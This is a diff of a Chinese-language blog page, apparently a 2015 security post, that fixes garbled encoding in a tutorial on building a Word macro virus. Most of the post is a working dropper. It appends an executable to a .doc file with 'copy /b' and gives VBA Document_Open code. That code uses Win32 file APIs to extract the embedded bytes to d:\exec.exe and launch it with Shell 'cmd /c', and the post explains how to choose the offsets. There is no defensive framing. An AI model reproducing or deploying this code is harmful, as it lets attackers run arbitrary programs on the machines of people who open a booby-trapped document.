@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>�겡��ִ����������exe. | ~Startゝ</title>
+  <title>宏病毒执行任意捆绑exe. | ~Startゝ</title>
   <meta name="author" content="rtoheaven">
   
   <meta name="description" content="Walk steps step by step">
@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="�겡��ִ����������exe."/>
+  <meta property="og:title" content="宏病毒执行任意捆绑exe."/>
   <meta property="og:site_name" content="~Startゝ"/>
 
   
@@ -57,25 +57,25 @@
       
       
   
-    <h1 class="title">�겡��ִ����������exe.</h1>
+    <h1 class="title">宏病毒执行任意捆绑exe.</h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="�겡�����">�겡�����</h2>
-<p>�겡����һ�ּĴ����ĵ���ģ���ĺ��еļ�����������һ�������������ĵ������еĺ��ͻᱻִ�У����Ǻ겡���ͻᱻ���ת�Ƶ��������ϣ���פ����Normalģ���ϡ�</p>
-<h2 id="�������̣�">�������̣�</h2>
-<p>�����õķ�����Ҫ�ǰ�PE�ļ��ӵ�doc�ļ����棬Ȼ��ͨ��API��������λ��PE�ļ�λ�ã������ͷų��������У�������ϸ˵����</p>
-<h1 id="һ����PE�ļ�Ƕ��doc�ļ���"><strong>һ����PE�ļ�Ƕ��doc�ļ���</strong></h1>
-<p>����ʵ�������򵥣���Ҫ�ӵ�exe�ŵ�������doc�ļ�ͬһ��Ŀ¼��.����doc����:<br>copy /b xxxx.doc + xxxxx.exe newdoc.doc<br>������ͼƬ��д�������Ƶġ�</p>
-<h1 id="�������������룬ʵ�鹦��"><strong>�������������룬ʵ�鹦��</strong></h1>
-<p>�������õ���office2013,���ȴ���doc�ļ������������ϵĿ������ߣ��������������ڣ����ο�<a href="http://jingyan.baidu.com/article/9f7e7ec05965d46f28155496.html��,
-Ȼ������Visual Basic,���ɴ��� Microsoft Visual Basic�༭������дVB���루office�����ĺ���������VBA��������
-������ǿ���£�����������doc�ļ�����ʱָ��exe�ļ�������д��VB������д��**Newtext(doc�ļ���" target="_blank" rel="external">�򿪿�������</a>**�����ģ������ǽ�������Normal�<br>���ȣ�<br>�������ǰѺ���������һЩ������������д����һ��ģ�����档<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214703.png" alt=""><br>1��createfile ���ڴ����ļ�,�ú���vb����������:<br>declare function createfile lib “kernel32” alias “createfilea” (byval lpfilename as string,<br>byval dwdesiredaccess as long, byval dwsharemode as long, byval lpsecurityattributes<br>as long, byval dwcreationdistribution as long, byval dwflagsandattributes as long, byval htemplate as long) as long<br>2)closehandle ���ڹرձ������ļ��ľ���,�ú���vb����������:<br>declare function closehandle lib “kernel32” (byval hobject as long) as long<br>3)readfile ���ڴӱ������ļ��ж�ȡ����,�ú���vb����������:<br>declare function readfile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestoread<br>as long, lpnumberofbytesread as long, byval lpoverlapped as long) as long<br>4)writefile ���ڰѶ�ȡ��������д���ļ�,�ú���vb����������:<br>declare function writefile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestowrite<br>as long, lpnumberofbyteswritten as long, byval lpoverlapped as long) as long<br>5)setfileponiter�ƶ��ļ�ָ��,�ú���vb����������:<br>declare function setfilepointer lib “kernel32” (byval hfile as long, byval ldistancetomove as long, byval<br>lpdistancetomovehigh as long, byval dwmovemethod as long) as long<br>6)���������Ϻ����Ĳ�������<br>public const generic_read as long = &amp;h80000000<br>public const generic_write as long = &amp;h40000000<br>public const file_share_read as long = 1<br>public const file_share_write as long = 2<br>public const create_new as long = 1<br>public const create_always as long = 2<br>public const open_existing as long = 3<br>public const open_always as long = 4<br>public const truncate_existing as long = 5<br>public const invalid_handle_value as long = -1<br>public const file_attribute_normal as long = &amp;h80</p>
-<p>���Σ�<br>���Ĵ��빦�ܣ����ǲ���������API��<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214607.jpg" alt=""><br>�������£�<br>‘’’c<br>Private Sub Document_Open()<br>Dim buffer(114688) As Byte<br>Dim h, h2, j, i, k As Long<br>h = CreateFile(ThisDocument.Path &amp; “/“ &amp; ThisDocument.Name, generic_read, file_share_read + file_share_write, 0, open_existing, 0, 0)<br>‘��share_read�ķ�ʽ����������doc�ļ�<br>h2 = CreateFile(“d:\exec.exe”, generic_write, 0, 0, create_always, 0, 0)<br>‘�½�һ��exe�ļ�׼�����Ŷ�ȡ����������.<br>If h = invalid_handle_value Then<br>Exit Sub<br>End If<br>k = SetFilePointer(h, 91136, nil, 0)<br>‘���ļ�ָ���ƶ���doc�ļ���exe�ļ����紦.<br>Do<br>i = ReadFile(h, buffer(0), 114688, j, 0)<br>i = WriteFile(h2, buffer(0), j, j, 0)<br>Loop Until j &lt; 114688<br>CloseHandle (h)<br>CloseHandle (h2)<br>Shell “cmd /c d:\exec.exe”<br>‘����exe�ļ�<br>End Sub<br>‘’’<br>�е�API���̾������˶��ܿ����ģ�����Ҫ��VB���죬�Ҷ�VBҲһ�ϲ�ͨ����Ȼ�����Ĵ����ܼ򵥣������ͷŵ�D�̣���ʵ�������ͷŵ���ʱĿ¼��Щ���ȵȡ�<br>�����ص�˵���£��������Ķ������֡�<br><strong><em>91136��ָ���Ѻ�����Ƕ���Ժ������ļ���С</em></strong><br><strong><em>114688������Ƕ��PE�ļ��Ĵ�С��</em></strong><br><strong><em>�����Ĳ����������ǣ��ȴ���doc�ļ���д�������룬������������Ҫ����д����������doc�ļ���С�Ͳ�֪���ˣ�����������������дһ�����֣��ڱ���һ�£��鿴doc�ļ���С���޸�һ�¼��ɣ���������CP��������PE�ļ���</em></strong></p>
-<h1 id="������ʾЧ��-"><strong>������ʾЧ��</strong>.</h1>
-<p>����doc�ļ�������ʾ�к����룬�����������Ϳ������С����Ժ겡�������кܶԱ׶ˡ�<br>����ͼ��ʾ��<br>����ͼ��ʾ��<img src="/img/QQͼƬ20150113214627.jpg" alt=""></p>
+        <h2 id="宏病毒概念：">宏病毒概念：</h2>
+<p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。</p>
+<h2 id="制作流程：">制作流程：</h2>
+<p>这里用的方法主要是把PE文件接到doc文件后面，然后通过API函数，定位到PE文件位置，最后释放出来并运行，下面详细说明。</p>
+<h3 id="一、把PE文件嵌入doc文件中">一、把PE文件嵌入doc文件中</h3>
+<p>这个实现起来简单，把要接的exe放到和这个doc文件同一个目录下.运行doc命令:<br>copy /b xxxx.doc + xxxxx.exe newdoc.doc<br>这个跟图片隐写技术类似的。</p>
+<h3 id="二、创建宏代码，实验功能">二、创建宏代码，实验功能</h3>
+<p>我这里用的是office2013,首先打开doc文件，点击界面上的开发工具（如果开发工具在，请参考<a href="http://jingyan.baidu.com/article/9f7e7ec05965d46f28155496.html）,
+然后点击Visual Basic,即可打开 Microsoft Visual Basic编辑器，书写VB代码（office里面的宏代码是用VBA开发）。
+在这里强调下，由于是想在doc文件打开时指向exe文件，所以写的VB代码是写在**Newtext(doc文件名" target="_blank" rel="external">打开开发工具</a>**里面的，而不是建在上面Normal里。<br>首先：<br>这里我是把函数声明与一些函数参数声明写在了一个模块里面。<br>如下图所示：<img src="/img/QQ图片20150113214703.png" alt=""><br>1）createfile 用于打开文件,该函数vb的声明如下:<br>declare function createfile lib “kernel32” alias “createfilea” (byval lpfilename as string,<br>byval dwdesiredaccess as long, byval dwsharemode as long, byval lpsecurityattributes<br>as long, byval dwcreationdistribution as long, byval dwflagsandattributes as long, byval htemplate as long) as long<br>2)closehandle 用于关闭被打开文件的句柄,该函数vb的声明如下:<br>declare function closehandle lib “kernel32” (byval hobject as long) as long<br>3)readfile 用于从被打开文件中读取数据,该函数vb的声明如下:<br>declare function readfile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestoread<br>as long, lpnumberofbytesread as long, byval lpoverlapped as long) as long<br>4)writefile 用于把读取出的数据写入文件,该函数vb的声明如下:<br>declare function writefile lib “kernel32” (byval hfile as long, lpbuffer as byte, byval dwnumberofbytestowrite<br>as long, lpnumberofbyteswritten as long, byval lpoverlapped as long) as long<br>5)setfileponiter移动文件指针,该函数vb的声明如下:<br>declare function setfilepointer lib “kernel32” (byval hfile as long, byval ldistancetomove as long, byval<br>lpdistancetomovehigh as long, byval dwmovemethod as long) as long<br>6)下面是以上函数的参数声明<br>public const generic_read as long = &amp;h80000000<br>public const generic_write as long = &amp;h40000000<br>public const file_share_read as long = 1<br>public const file_share_write as long = 2<br>public const create_new as long = 1<br>public const create_always as long = 2<br>public const open_existing as long = 3<br>public const open_always as long = 4<br>public const truncate_existing as long = 5<br>public const invalid_handle_value as long = -1<br>public const file_attribute_normal as long = &amp;h80</p>
+<p>其次：<br>核心代码功能，就是操作上面的API。<br>如下图所示：<img src="/img/QQ图片20150113214607.jpg" alt=""><br>代码如下：<br>‘’’c<br>Private Sub Document_Open()<br>Dim buffer(114688) As Byte<br>Dim h, h2, j, i, k As Long<br>h = CreateFile(ThisDocument.Path &amp; “/“ &amp; ThisDocument.Name, generic_read, file_share_read + file_share_write, 0, open_existing, 0, 0)<br>‘以share_read的方式打开自身的doc文件<br>h2 = CreateFile(“d:\exec.exe”, generic_write, 0, 0, create_always, 0, 0)<br>‘新建一个exe文件准备存放读取出来的数据.<br>If h = invalid_handle_value Then<br>Exit Sub<br>End If<br>k = SetFilePointer(h, 91136, nil, 0)<br>‘把文件指针移动到doc文件与exe文件交界处.<br>Do<br>i = ReadFile(h, buffer(0), 114688, j, 0)<br>i = WriteFile(h2, buffer(0), j, j, 0)<br>Loop Until j &lt; 114688<br>CloseHandle (h)<br>CloseHandle (h2)<br>Shell “cmd /c d:\exec.exe”<br>‘运行exe文件<br>End Sub<br>‘’’<br>有点API编程经验的人都能看懂的，不需要对VB很熟，我对VB也一窍不通。当然上面的代码很简单，我是释放到D盘，其实都可以释放到临时目录这些，等等。<br>这里重点说明下，这上面的二个数字。<br><strong>91136是指你把宏代码嵌入以后整个文件大小</strong><br><strong>114688代码你嵌入PE文件的大小。</strong><br><strong>整个的操作步骤的是：先打开doc文件，写入宏代码，这里可能有人要问我写如宏代码后doc文件大小就不知道了，所以你可以先随便写一个数字，在保存一下，查看doc文件大小，修改一下即可，最后在用CP命令添加PE文件。</strong></p>
+<h3 id="三、演示效果">三、演示效果</h3>
+<p>打开doc文件，会提示有宏代码，若点击允许，就可以运行。所以宏病毒还是有很对弊端。<br>如下图所示：<br><img src="/img/QQ图片20150113214627.jpg" alt=""></p>
 
       
     </div>
@@ -84,7 +84,7 @@
         
   
   <div class="categories">
-    <a href="/categories/��o����/">��ȫ����</a>
+    <a href="/categories/安全技术/">安全技术</a>
   </div>
 
         
@@ -155,11 +155,9 @@ var duoshuoQuery = {short_name:"rtoheaven"};
   
     <li><a href="/categories/基础编程/">基础编程</a><small>1</small></li>
   
-    <li><a href="/categories/安全技术/">安全技术</a><small>1</small></li>
+    <li><a href="/categories/安全技术/">安全技术</a><small>2</small></li>
   
     <li><a href="/categories/工具使用/">工具使用</a><small>1</small></li>
-  
-    <li><a href="/categories/��o����/">��ȫ����</a><small>1</small></li>
   
   </ul>
 </div>
@@ -171,7 +169,7 @@ var duoshuoQuery = {short_name:"rtoheaven"};
   <ul class="entry">
     
       <li>
-        <a href="/2015/01/13/宏病毒（exe执行）/">�겡��ִ����������exe.</a>
+        <a href="/2015/01/13/宏病毒（exe执行）/">宏病毒执行任意捆绑exe.</a>
       </li>
     
       <li>
